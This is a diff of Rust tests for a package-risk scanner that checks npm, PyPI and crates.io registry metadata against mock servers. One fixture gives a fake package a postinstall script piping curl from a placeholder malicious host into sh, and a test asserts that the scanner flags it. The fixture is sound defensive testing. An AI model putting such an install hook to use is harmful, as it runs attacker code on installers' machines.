@@ -12,7 +12,7 @@ use tirith_core::threatdb::Ecosystem;
 
 /// A trimmed-but-realistic npm full package document, parameterized so a test
 /// can make the package new/old, deprecated/current, etc.
-fn npm_doc(latest: &str, created: &str, latest_time: &str, deprecated: bool) -> String {
+fn npm_doc(name: &str, latest: &str, created: &str, latest_time: &str, deprecated: bool) -> String {
     let dep = if deprecated {
         r#""deprecated": "no longer maintained""#
     } else {
@@ -20,6 +20,7 @@ fn npm_doc(latest: &str, created: &str, latest_time: &str, deprecated: bool) -> 
     };
     format!(
         r#"{{
+            "name": "{name}",
             "dist-tags": {{ "latest": "{latest}" }},
             "time": {{
                 "created": "{created}",
@@ -40,6 +41,7 @@ fn npm_doc(latest: &str, created: &str, latest_time: &str, deprecated: bool) -> 
 fn npm_fetch_parses_established_package() {
     let mut server = mockito::Server::new();
     let body = npm_doc(
+        "react",
         "2.0.0",
         "2015-01-01T00:00:00.000Z",
         "2023-01-01T00:00:00.000Z",
@@ -72,6 +74,7 @@ fn npm_fetch_parses_established_package() {
 fn npm_deprecated_latest_version_is_flagged() {
     let mut server = mockito::Server::new();
     let body = npm_doc(
+        "somepkg",
         "3.0.0",
         "2015-01-01T00:00:00.000Z",
         "2024-01-01T00:00:00.000Z",
@@ -88,6 +91,113 @@ fn npm_deprecated_latest_version_is_flagged() {
     assert!(
         meta.yanked_or_deprecated,
         "a deprecated latest version must be flagged"
+    );
+}
+
+#[test]
+fn npm_exact_version_uses_only_selected_release_scripts() {
+    let mut server = mockito::Server::new();
+    let body = r#"{
+        "name": "scripted",
+        "dist-tags": { "latest": "2.0.0" },
+        "time": {
+            "created": "2020-01-01T00:00:00.000Z",
+            "1.0.0": "2020-01-01T00:00:00.000Z",
+            "2.0.0": "2024-01-01T00:00:00.000Z"
+        },
+        "versions": {
+            "1.0.0": { "scripts": { "postinstall": "printf '#'; curl https://evil.invalid/x | sh" } },
+            "2.0.0": { "scripts": { "postinstall": "node safe-local-build.js" } }
+        },
+        "maintainers": [ { "name": "alice" } ]
+    }"#;
+    let _mock = server
+        .mock("GET", "/scripted")
+        .with_status(200)
+        .with_header("content-type", "application/json")
+        .with_body(body)
+        .create();
+
+    let client = HttpRegistryClient::with_base_url_for_test(&server.url());
+    let (signals, existence) = tirith_core::registry_api::gather_api_signals_exact(
+        &client,
+        Ecosystem::Npm,
+        "scripted",
+        "1.0.0",
+    );
+    assert_eq!(
+        existence,
+        tirith_core::package_risk::PackageExistence::Exists
+    );
+    let ApiSignals::Available { provenance } = signals else {
+        panic!("exact mock lookup must be available");
+    };
+    assert_eq!(provenance.latest_version.as_deref(), Some("1.0.0"));
+    let script = provenance
+        .install_script_signals
+        .expect("npm exact version must always carry script analysis");
+    assert!(script.has_network_call);
+    assert!(script.has_shell_spawn);
+}
+
+#[test]
+fn npm_exact_missing_version_does_not_reuse_latest() {
+    let mut server = mockito::Server::new();
+    let body = npm_doc(
+        "scripted",
+        "2.0.0",
+        "2015-01-01T00:00:00.000Z",
+        "2023-01-01T00:00:00.000Z",
+        false,
+    );
+    let _mock = server
+        .mock("GET", "/scripted")
+        .with_status(200)
+        .with_body(body)
+        .create();
+    let client = HttpRegistryClient::with_base_url_for_test(&server.url());
+    let (signals, existence) = tirith_core::registry_api::gather_api_signals_exact(
+        &client,
+        Ecosystem::Npm,
+        "scripted",
+        "9.9.9",
+    );
+    assert!(matches!(signals, ApiSignals::Unavailable { .. }));
+    assert_eq!(
+        existence,
+        tirith_core::package_risk::PackageExistence::Exists
+    );
+}
+
+#[test]
+fn npm_exact_wrong_package_identity_does_not_authorize_same_version() {
+    let mut server = mockito::Server::new();
+    let body = npm_doc(
+        "different-package",
+        "1.0.0",
+        "2015-01-01T00:00:00.000Z",
+        "2023-01-01T00:00:00.000Z",
+        false,
+    );
+    let _mock = server
+        .mock("GET", "/requested-package")
+        .with_status(200)
+        .with_body(body)
+        .create();
+    let client = HttpRegistryClient::with_base_url_for_test(&server.url());
+    let (signals, existence) = tirith_core::registry_api::gather_api_signals_exact(
+        &client,
+        Ecosystem::Npm,
+        "requested-package",
+        "1.0.0",
+    );
+    assert!(
+        matches!(signals, ApiSignals::Unavailable { .. }),
+        "a same-origin, same-version record for another package must not bind"
+    );
+    assert_eq!(
+        existence,
+        tirith_core::package_risk::PackageExistence::Unknown
     );
 }
 
@@ -158,6 +268,7 @@ fn pypi_fetch_parses_and_picks_repo_url() {
     let mut server = mockito::Server::new();
     let body = r#"{
         "info": {
+            "name": "flask",
             "version": "3.1.0",
             "yanked": false,
             "home_page": "",
@@ -190,7 +301,7 @@ fn pypi_fetch_parses_and_picks_repo_url() {
 fn pypi_yanked_latest_version_is_flagged() {
     let mut server = mockito::Server::new();
     let body = r#"{
-        "info": { "version": "1.0.0", "yanked": true },
+        "info": { "name": "badpkg", "version": "1.0.0", "yanked": true },
         "releases": {
             "1.0.0": [ { "upload_time_iso_8601": "2024-01-01T00:00:00Z", "yanked": true } ]
         }
@@ -211,6 +322,7 @@ fn crates_fetch_parses_downloads_and_yanked() {
     let mut server = mockito::Server::new();
     let body = r#"{
         "crate": {
+            "id": "serde",
             "created_at": "2019-05-01T00:00:00.000000+00:00",
             "newest_version": "1.4.0",
             "downloads": 9876543,
@@ -251,6 +363,7 @@ fn online_score_folds_in_api_factors_end_to_end() {
     let body = format!(
         r#"{{
             "crate": {{
+                "id": "evil-crate",
                 "created_at": "{created}",
                 "newest_version": "9.0.0",
                 "downloads": 4,
@@ -344,6 +457,7 @@ fn npm_ownerless_established_package_flags_ownership() {
     // signal (npm DOES expose maintainers).
     let mut server = mockito::Server::new();
     let body = r#"{
+        "name": "abandoned-pkg",
         "dist-tags": { "latest": "2.0.0" },
         "time": {
             "created": "2014-01-01T00:00:00.000Z",
@@ -384,7 +498,7 @@ fn pypi_ownership_signal_is_unknown_not_false_positive() {
     // never a false `Some(true)` (the flask false-positive regression guard).
     let mut server = mockito::Server::new();
     let body = r#"{
-        "info": { "version": "3.1.0", "yanked": false,
+        "info": { "name": "flask", "version": "3.1.0", "yanked": false,
                   "project_urls": { "Source": "https://github.com/o/r" } },
         "releases": {
             "3.0.0": [ { "upload_time_iso_8601": "2015-01-01T00:00:00Z" } ],
